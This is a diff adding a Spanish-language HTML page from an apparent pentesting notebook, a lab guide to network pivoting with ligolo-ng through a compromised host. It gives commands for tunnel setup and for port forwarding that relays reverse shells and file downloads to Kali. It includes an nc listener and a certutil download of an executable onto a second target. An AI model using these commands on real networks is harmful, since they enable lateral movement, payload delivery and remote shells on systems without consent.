@@ -1,0 +1,178 @@
+```html
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png" />
+    <title>Ligolo | Notebook</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes">
+          <h1>Notebook</h1>
+
+          <nav class="vault-tree" aria-label="Ficheros">
+            <a class="vault-file" href="/notebook.html">Inicio</a>
+            <details class="vault-folder" open>
+              <summary>Pivoting</summary>
+              <a class="vault-file is-active" href="/notebook/pivoting/ligolo.html">Ligolo</a>
+              <a class="vault-file" href="/notebook/pivoting/metasploit.html">Metasploit</a>
+              <a class="vault-file" href="/notebook/pivoting/chisel-socat.html">Chisel y Socat</a>
+            </details>
+          </nav>
+        </aside>
+
+        <article class="note-panel is-active" id="ligolo">
+          <div class="note-tabbar">
+            <span>Ligolo</span>
+            <span>~/notebook/Pivoting</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">pivoting / ligolo-ng</p>
+            <h2>Ligolo</h2>
+
+            <h2>Escenario</h2>
+
+            <div class="note-kv">
+              <p><code>KALI:</code> <span class="ip-green">10.0.2.100</span></p>
+              <p><code>Target A:</code> <span class="ip-green">10.0.2.102</span> / <span class="ip-yellow">192.168.1.101</span></p>
+              <p><code>Target B:</code> <span class="ip-yellow">192.168.1.102</span></p>
+            </div>
+
+            <h2>Preparativos</h2>
+
+            <section class="code-card">
+              <h3>Kali: Crear interfaz y ruta</h3>
+              <pre><code># Crear la interfaz Ligolo en modo túnel
+sudo ip tuntap add user $USER mode tun ligolo
+
+# Activar la interfaz Ligolo
+sudo ip link set ligolo up
+
+# Confirmar que la interfaz está activa
+ip addr show ligolo
+
+# Crear ruta hacia la red interna del pivoting
+sudo ip route add 192.168.1.0/24 dev ligolo</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Kali: Ejecutar proxy Ligolo</h3>
+              <pre><code>./proxy -selfcert
+
+# -selfcert evita problemas con certificados autofirmados</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Target A: Ejecutar agent</h3>
+              <pre><code># Compartir y ejecutar el agent en el Target A
+# En Linux, añadir permisos de ejecución si fuera necesario:
+chmod +x agent
+
+./agent -connect &lt;kali_ip&gt;:11601 -ignore-cert
+
+# Kali: consola de Ligolo
+session 1
+start</code></pre>
+            </section>
+
+            <aside class="callout danger">
+              <p>Ya podemos lanzar comandos como si estuviésemos dentro de ese segmento de red desde Kali.</p>
+              <pre><code>ping -c1 &lt;ip_target_b&gt;</code></pre>
+            </aside>
+
+            <h2>Portforwarding</h2>
+
+            <aside class="callout warning">
+              <p>Kali tiene visibilidad sobre la red interna, pero el Target B no tiene visibilidad directa con Kali.</p>
+              <p><strong>Transferencia de archivos:</strong> abrir el puerto 8080 de Target A para redirigir el tráfico al puerto 80 de Kali.</p>
+              <p><strong>Reverse shells:</strong> abrir el puerto 4443 de Target A para redirigir el tráfico al puerto 443 de Kali.</p>
+              <p>Los puertos usados para portforwarding deberían ser superiores a 1000 para evitar problemas de permisos.</p>
+            </aside>
+
+            <section class="code-card">
+              <h3>Kali: consola proxy Ligolo</h3>
+              <pre><code># --addr 0.0.0.0:8080 -&gt; Todo tráfico que reciba Target A por el puerto 8080 se envía a Kali
+# --to 127.0.0.1:80   -&gt; Redirecciona el tráfico al puerto 80 de Kali
+
+listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
+listener_add --addr 0.0.0.0:4443 --to 127.0.0.1:443
+listener_list</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Transferir ficheros</h3>
+              <pre><code># Kali
+python3 -m http.server 80
+
+# Target B Windows
+certutil -urlcache -f http://&lt;ip_target_a&gt;:8080/file.exe file.exe
+
+# Target B Linux
+curl -O http://&lt;ip_target_a&gt;:8080/file.txt
+wget http://&lt;ip_target_a&gt;:8080/file.txt</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Reverse shells</h3>
+              <pre><code># Kali
+nc -nlvp 443
+
+# Target B
+# rev_shell: &lt;ip_target_a&gt;:4443</code></pre>
+            </section>
+
+            <h2>Limpieza</h2>
+
+            <section class="code-card">
+              <h3>Limpiar configuración de pivoting</h3>
+              <pre><code># Ver rutas
+ip route list
+
+# Borrar ruta hacia la red interna
+sudo ip route del 192.168.1.0/24 dev ligolo
+
+# Ver interfaces
+ip addr
+
+# Borrar interfaz Ligolo
+sudo ip link del ligolo</code></pre>
+            </section>
+
+            <h2>Instalación</h2>
+
+            <p><a href="https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.3">Ligolo Releases</a></p>
+
+            <section class="code-card">
+              <h3>Kali: Descomprimir agent y proxy</h3>
+              <pre><code># Descargar Ligolo proxy Linux AMD64 para Kali
+# Descargar Ligolo agent Linux/Windows según la máquina pivot
+
+7z x comprimido.tar.gz
+7z x comprimido.tar
+
+chmod +x proxy
+chmod +x agent
+
+# Eliminar comprimidos de Ligolo
+rm -f ligolo-ng_*</code></pre>
+            </section>
+                 <h2>Tags</h2>
+            <div class="tag-list">
+              <span>pivoting</span>
+              <span>portforwarding</span>
+              <span>ligolo</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+  </body>
+</html>
+```
